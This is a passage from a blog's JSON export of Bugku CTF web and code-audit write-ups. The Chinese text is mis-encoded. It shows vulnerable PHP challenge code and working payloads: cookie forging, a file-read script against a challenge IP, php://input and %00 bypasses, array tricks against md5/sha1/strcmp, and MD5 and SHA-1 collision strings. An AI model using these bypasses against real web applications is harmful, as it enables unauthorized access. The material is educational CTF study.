bugkuctf","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†bugkuä¸­webéƒ¨åˆ†é¢˜çš„writeup,æ„Ÿè§‰è¿™äº›é¢˜è‡ªå·±æ”¶è·è¿˜æŒºå¤šçš„ï¼ŒåŒ…æ‹¬ä»¥ä¸‹é¢˜ç›®ï¼š cookiesæ¬ºéª— welcome to bugkuctf cookiesæ¬ºéª—æ‰“å¼€é¢˜ç›®æ˜¯è¿™æ ·çš„ï¼š http://123.206.87.240:8002/web11/index.php?line=&amp;filename=a2V5cy50eHQ= ä¼šè‡ªåŠ¨è·³è½¬åˆ°è¿™ä¸ªurl,a2V5cy50eHQ=å¾ˆæƒ³base64åŠ å¯†åçš„ç»“æœï¼Œè§£å¯†ä¸€ä¸‹å‘ç°è§£å¯†ç»“æœä¸ºkeys.txtï¼Œæ˜¾ç„¶filenameè¿™ä¸ªå‚æ•°ä¼ çš„æ˜¯æ–‡ä»¶åå­—base64åŠ å¯†åçš„ç»“æœï¼Œæ˜¯å¦å¯ä»¥ä¼ è¾“index.phpåŠ å¯†çš„ç»“æœå‘¢ï¼Ÿ index.phpç»base64åŠ å¯†åä¸ºaW5kZXgucGhwï¼Œè¯•ç€è®¿é—®ä¸€ä¸‹ http://123.206.87.240:8002/web11/index.php?line=&amp;filename=aW5kZXgucGhw å‘ç°å†…å®¹ä¸ºç©ºç™½ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æœ‰ä¸ª &lt;?php å°†line=2å‘ç° $file=base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;); çœ‹æ¥æ€è·¯å¯¹äº†ï¼Œlineä»£è¡¨çš„å°±æ˜¯è¡Œæ•°ï¼Œå†™ä¸ªè„šæœ¬çœ‹ä¸‹å§ 12345678import requestsurls&#x3D;[&quot;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web11&#x2F;index.php?line&#x3D;&#123;&#125;&amp;filename&#x3D;aW5kZXgucGhw&quot;.format(str(i))for i in range(100)]li&#x3D;&quot;&quot;for url in urls: r&#x3D;requests.get(url) if r.status_code&#x3D;&#x3D;200: li+&#x3D;(r.text)print(li) å› ä¸ºä¸çŸ¥é“æœ‰å¤šå°‘è¡Œä»£ç ï¼Œå…ˆè®¾æˆ100å§ï¼Œè·‘ä¸‹ï¼Œå¾—åˆ°ä»¥ä¸‹ä»£ç  1234567891011121314151617&lt;?phperror_reporting(0);$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);$file_list &#x3D; array(&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,);if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;$file_list[2]&#x3D;&#39;keys.php&#39;;&#125;if(in_array($file, $file_list))&#123;$fa &#x3D; file($file);echo $fa[$line];&#125;?&gt; è§‚å¯Ÿä»£ç å¯çŸ¥éœ€è¦è®¾ç½®Cookie,è¿˜æœ‰ä¸ªç‰¹æ®Šæ–‡ä»¶keys.php,å¯èƒ½flagå°±åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶åbase64åŠ å¯†åæ˜¯a2V5cy5waHA= in_array()å‡½æ•°ç”¨äºæœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ï¼ŒæŠ“åŒ…çœ‹ä¸‹ payload:/web11/index.php?line=&amp;filename=a2V5cy5waHA= è®¾ç½®Cookie: margin=margin å¾—åˆ°flag KEY&#123;key_keys&#125; never give upæ‹¿åˆ°é¢˜ç›®æ˜¯è¿™æ ·çš„ å¥½åƒæ²¡ä»€ä¹ˆæ€è·¯ï¼ŒæŠ“åŒ…çœ‹çœ‹å§ è®¿é—®/test/hello.phpä¼šè·³è½¬åˆ°/test/hello.php?id=1ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°æœ‰ä¸ª1p.htmlï¼Œè®¿é—®ä¸€ä¸‹ å‘ç°ï¼Œä¸æŠ“åŒ…çš„è¯ä¼šè·³è½¬ 12345678910&lt;!--var Words &#x3D;&quot;%3Cscript%3Ewindow.location.href%3D%27http%3A&#x2F;&#x2F;www.bugku.com%27%3B%3C&#x2F;script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E&quot; function OutWord()&#123;var NewWords;NewWords &#x3D; unescape(Words);document.write(NewWords);&#125; OutWord();&#x2F;&#x2F; --&gt; Wordsä¸­é—´å¥½åƒæœ‰urlç¼–ç ï¼Œhackbarè§£ç å¾—åˆ° 12&lt;script&gt;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;www.bugku.com&#39;;&lt;&#x2F;script&gt; &lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ&#x3D;&#x3D;--&gt; åˆçœ‹åˆ°å…¶ä¸­å¾ˆåƒbase64ï¼Œè§£ç å¾— 1%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E å¥½åƒè¿˜æ˜¯urlç¼–ç ï¼Œå†è§£å¯† 12345678910111213141516171819202122232425&quot;;if(!$_GET[&#39;id&#39;])&#123; header(&#39;Location: hello.php?id&#x3D;1&#39;); exit();&#125;$id&#x3D;$_GET[&#39;id&#39;];$a&#x3D;$_GET[&#39;a&#39;];$b&#x3D;$_GET[&#39;b&#39;];if(stripos($a,&#39;.&#39;))&#123; echo &#39;no no no no no no no&#39;; return ;&#125;$data &#x3D; @file_get_contents($a,&#39;r&#39;);if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt; çœ‹åˆ°æœ‰ä¸ªf4l2a3g.txtï¼Œç›´æ¥è®¿é—®å¯ä»¥å¾—åˆ°flag flag&#123;tHis_iS_THe_fLaG&#125; é™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡ payload:/test/hello.php?id=0easad&amp;b=%00adssadsa&amp;a=php://input postè¿‡å»ï¼šbugku is a nice plateform! phpä¼šé»˜è®¤è®¤ä¸º0eå¼€å¤´çš„å¼±ç­‰äº0 eregi()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸² int eregi(string pattern, string string, [array regs]); å­˜åœ¨%00æˆªæ–­æ¼æ´ï¼Œå³%00åé¢çš„å†…å®¹ä¸è§£æ substr()å‡½æ•°ç”¨äºè¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"},{"name":"bugku","slug":"bugku","permalink":"http://www.m00nback.xyz/tags/bugku/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"}]},{"title":"bugkuä»£ç å®¡è®¡writeup","slug":"bugku-codecheck-wp","date":"2019-09-29T13:06:26.000Z","updated":"2019-10-17T05:57:26.991Z","comments":true,"path":"2019/09/29/bugku-codecheck-wp/","link":"","permalink":"http://www.m00nback.xyz/2019/09/29/bugku-codecheck-wp/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†bugkuä¸Šwebä»£ç å®¡è®¡éƒ¨åˆ†çš„writeup!","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†bugkuä¸Šwebä»£ç å®¡è®¡éƒ¨åˆ†çš„writeup! extractå˜é‡è¦†ç›–é¢˜ç›®ç»™å‡ºçš„æºç  12345678910111213141516&lt;?php$flag&#x3D;&#39;xxx&#39;;extract($_GET); if(isset($shiyan)) &#123; $content&#x3D;trim(file_get_contents($flag)); if($shiyan&#x3D;&#x3D;$content) &#123; echo&#39;flag&#123;xxx&#125;&#39;; &#125; else &#123; echo&#39;Oh.no&#39;; &#125; &#125;?&gt; å‡½æ•°è§£é‡Šï¼š extract()å‡½æ•° ç”¨é€”ï¼šä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ï¼Œè¿”å›å€¼(intå‹)æ˜¯æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›® ä»€ä¹ˆæ˜¯ç¬¦å·è¡¨ï¼Ÿ ç¬¦å·è¡¨æ˜¯æŒ‡å½“å‰phpé¡µé¢ä¸­ï¼Œæ‰€æœ‰å˜é‡åç§°çš„é›†åˆ isset()å‡½æ•° ç”¨é€”ï¼šæ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼Œå¹¶ä¸”ä¸æ˜¯ NULL æ³¨æ„ï¼š$_GETä¼ è¿‡æ¥çš„å‚æ•°çš„é”®å€¼ä¸ºstringç±»å‹ file_get_contents()å‡½æ•° ç”¨é€”ï¼šfile_get_contents() å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­å¦‚æœå¤±è´¥ï¼Œfile_get_contents() å°†è¿”å› FALSE trim()å‡½æ•° ç”¨é€”ï¼šç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ è§£é¢˜æ€è·¯ï¼š é¦–å…ˆè¦GETä¼ ä¸€ä¸ªå‚æ•°shiyan ç„¶åè¯»å–äº†$flagæ‰€ä»£è¡¨æ–‡ä»¶çš„å†…å®¹ payload: ?shiyan=&amp;flag=1 æ­¤æ—¶$shiyan=â€™â€™(ç©ºå­—ç¬¦ä¸²),è€Œä¸æ˜¯NULL,flagåªéœ€ä¼ é™¤å­˜åœ¨çš„æ–‡ä»¶åä»¥å¤–ä»»æ„å€¼,ç©ºå­—ç¬¦ä¸²å¼±ç­‰äºFALSE,è¾“å‡ºflag flag&#123;bugku-dmsj-p2sm3N&#125; strcmpæ¯”è¾ƒå­—ç¬¦ä¸²é¢˜ç›®ä»£ç ï¼š 1234567891011&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123; if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼Œå¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ &#x2F;&#x2F;æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ die(&#39;Flag: &#39;.$flag); else print &#39;No&#39;;&#125;?&gt; åˆ†æä»£ç å¯çŸ¥éœ€è¦ä¼ é€’ä¸ªå‚æ•°a æ¯”è¾ƒaå’Œ$flagçš„å€¼ï¼Œç›¸åŒå°±ä¼šè¾“å‡ºflagå¹¶ç»“æŸ è¿™é‡Œå¯ä»¥ä¼ å…¥æ•°ç»„ï¼Œstrcmp()å‡½æ•°å½“æ¯”è¾ƒæ•°ç»„å’Œå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œè¿”å›æ˜¯NULLå³å¯ç»•è¿‡ payloadï¼š?a[]=1 flag&#123;bugku_dmsj_912k&#125; urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot; not allowed! &quot;); exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123; echo &quot; Access granted! &quot;; echo &quot; flag &quot;;&#125;?&gt; å‡½æ•°è§£é‡Šï¼š eregi()å‡½æ•° int eregi(string pattern, string string, [array regs]); eregi()å‡½æ•°åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æœç´¢æŒ‡å®šçš„æ¨¡å¼çš„å­—ç¬¦ä¸²ã€‚æœç´¢ä¸åŒºåˆ†å¤§å°å†™,å¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…æˆ–å‡ºé”™åˆ™è¿”å› FALSE å¤„ç†æ•°ç»„å°†è¿”å›NULL urldecode()å‡½æ•° è§£ç ç»™å‡ºçš„å·²ç¼–ç å­—ç¬¦ä¸²ä¸­çš„ä»»ä½• %##ã€‚ åŠ å·ï¼ˆâ€™+â€™ï¼‰è¢«è§£ç æˆä¸€ä¸ªç©ºæ ¼å­—ç¬¦ åˆ†æä»£ç å¯çŸ¥ä¸èƒ½è®©eregi()å‡½æ•°æˆåŠŸåŒ¹é…ï¼Œè¦è®©$_GET[id] == &quot;hackerDJ&quot;æˆç«‹ phpåœ¨å¤„ç†ä¼ é€’è¿‡æ¥çš„å‚æ•°æ˜¯ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç  å¯ä»¥äºŒæ¬¡ç¼–ç è¿›è¡Œç»•è¿‡ payload:?id=hackerD%254A %25æ˜¯%çš„urlç¼–ç ï¼Œ%4Aæ˜¯Jçš„urlç¼–ç  è¿™æ ·ç»è¿‡phpè§£æä¼šå¾—åˆ° ?id=hackerD%4A å†æ¬¡ç»è¿‡å‡½æ•°è§£æä¼šå¾—åˆ° ?id=hackerDJ md5()å‡½æ•°é¢˜ç›®ä»£ç ï¼š 12345678910111213&lt;?phperror_reporting(0);$flag &#x3D; &#39;flag&#123;test&#125;&#39;;if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123; if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;]) print &#39;Your password can not be your username.&#39;; else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;])) die(&#39;Flag: &#39;.$flag); else print &#39;Invalid password&#39;;&#125;?&gt; å‡½æ•°è§£é‡Šï¼š md5()å‡½æ•° ç”¨é€”ï¼šä»¥ 32 å­—ç¬¦åå…­è¿›åˆ¶æ•°å­—å½¢å¼è¿”å›æ•£åˆ—å€¼ **ç»•è¿‡æ–¹æ³•:**md5()å‡½æ•°ä¸èƒ½å¤„ç†æ•°ç»„ payload:?password[]=1&amp;username[]=2 md5()å‡½æ•°åœ¨å¤„ç†æ•°ç»„æ—¶ä¼šè¿”å›NULL md5ç¢°æ’ ä¸¤ä¸ªMD5å€¼ç›¸åŒçš„ä¸åŒå­—ç¬¦ä¸² Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 å’Œ Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 `flag&#123;bugk1u-ad8-3dsa-2&#125;` æ•°ç»„è¿”å›NULLç»•è¿‡é¢˜ç›®ä»£ç ï¼š 123456789101112&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;password&#39;])) &#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)echo &#39;You password must be alphanumeric&#39;;else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)die(&#39;Flag: &#39; . $flag);elseecho &#39;Invalid password&#39;;&#125;?&gt; å‡½æ•°è§£é‡Šï¼š strpos()å‡½æ•° ç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® int strpos( string $haystack, mixed $needle[, int $offset = 0] ) å¦‚æœæ²¡æ‰¾åˆ° needleï¼Œå°†è¿”å› FALSE å½“$haystackä¸ºæ•°ç»„æ—¶ï¼Œå‡½æ•°è¿”å›NULL,å½“$needleä¸ºæ•°ç»„æ—¶å‡½æ•°è¿”å›FALSE payload:?password[]=1 ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;])å’Œstrpos ($_GET[&#39;password&#39;], &#39;--&#39;)çš„è¿”å›ç»“æœéƒ½æ˜¯NULL,ä¸å¼ºç­‰äºFALSE flag&#123;ctf-bugku-ad-2131212&#125; å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡é¢˜ç›®ä»£ç ï¼š 1234$temp &#x3D; $_GET[&#39;password&#39;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336)&#123;echo $flag; åˆ†æé¢˜ç›®å¯çŸ¥GETä¼ å‚passwordï¼Œä¸”ä¸èƒ½ä¸ºçº¯æ•°å­— payload1:?password=2000a å­—ç¬¦ä¸²è¿›è¡Œæ•°å­¦è¿ç®—æ—¶ï¼Œä¼šè‡ªåŠ¨è½¬æ¢ä¸ºæ•°å­—åå†è¿›è¡Œè¿ç®— payload2:?password[]=1 is_numeric()å‡½æ•°å¤„ç†æ•°ç»„æ—¶ä¼šè¿”å›FALSE æ•°ç»„å¤§äºä»»ä¸€æ•°å­— flag&#123;bugku_null_numeric&#125; sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223242526272829&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))&#123;var_dump($_GET[&#39;name&#39;]);echo &quot;&quot;;var_dump($_GET[&#39;password&#39;]);var_dump(sha1($_GET[&#39;name&#39;]));var_dump(sha1($_GET[&#39;password&#39;]));if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])echo &#39;Your password can not be your name!&#39;;else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))die(&#39;Flag: &#39;.$flag);elseecho &#39;Invalid password.&#39;;&#125;elseecho &#39;Login first!&#39;;?&gt; ä¼ ä¸¤ä¸ªå‚æ•°ï¼Œnameå’Œpassword å¹¶ä¸”è¿™ä¸¤ä¸ªå‚æ•°è¦ç»è¿‡sha1()åŠ å¯†è¿˜è¦ç›¸ç­‰æ‰èƒ½è¾“å‡ºflag è¿™é‡Œä¾¿æƒ³åˆ°äº†ä¼ å…¥æ•°ç»„å°†è¿”å›NULL payload1:?name[]=1&amp;password[]=2 sha1()ç¢°æ’ payload2:?name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 å¥½åƒç›´æ¥æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œéœ€è¦æŸ¥çœ‹æºä»£ç æˆ–è€…æŠ“åŒ… flag&#123;bugku--daimasj-a2&#125; md5åŠ å¯†ç›¸ç­‰ç»•è¿‡é¢˜ç›®ä»£ç ï¼š 123456789101112&lt;?php$md51 &#x3D; md5(&#39;QNKCDZO&#39;);$a &#x3D; @$_GET[&#39;a&#39;];$md52 &#x3D; @md5($a);if(isset($a))&#123;if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;echo &quot;flag&#123;*&#125;&quot;;&#125; else &#123;echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125;?&gt; çœ‹åˆ°QNKCDZOç«‹é©¬æƒ³åˆ°äº†md5å¼±æ¯”è¾ƒ å³phpä¼šæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0 payload:?a=s878926199a å…¶ä¸­QNKCDZOå’Œs878926199a md5åŠ å¯†åéƒ½æ˜¯0eå¼€å¤´ flag&#123;bugku-dmsj-am9ls&#125; åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒé¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag &#x3D; &#39;flag&#123;test&#125;&#39;;$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼$number &#x3D; &#39;3735929054&#39;;&#x2F;&#x2F; Check all the input characters!for ($i &#x3D; 0; $i &lt; strlen($number); $i++)&#123;&#x2F;&#x2F; Disallow all the digits!$digit &#x3D; ord($temp&#123;$i&#125;);if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )&#123;&#x2F;&#x2F; Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number &#x3D;&#x3D; $temp)return $flag;&#125;$temp &#x3D; $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt; è¾“å‡ºflagçš„æ¡ä»¶$tempè¦å¼±ç­‰äº$number = â€˜3735929054â€™ï¼Œ$tempä¸ºä¼ å…¥å‚æ•°passwordçš„å€¼ï¼Œå¹¶ä¸”éå†$tempçš„æ¯ä¸ªå­—ç¬¦è¿˜ä¸èƒ½åœ¨1â€”-9ä¹‹é—´ çœ‹ç€é¢˜ç›®åç§°ä¾¿æƒ³åˆ°äº†è½¬æ¢16è¿›åˆ¶ payload:?password=0xdeadc0de 0xdeadc0deä¸º3735929054åå…­è¿›åˆ¶å½¢å¼ flag&#123;Bugku-admin-ctfdaimash&#125; å˜é‡è¦†ç›–eregæ­£åˆ™%00æˆªæ–­é¢˜ç›®ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?php$flag &#x3D; &quot;xxx&quot;;if (isset 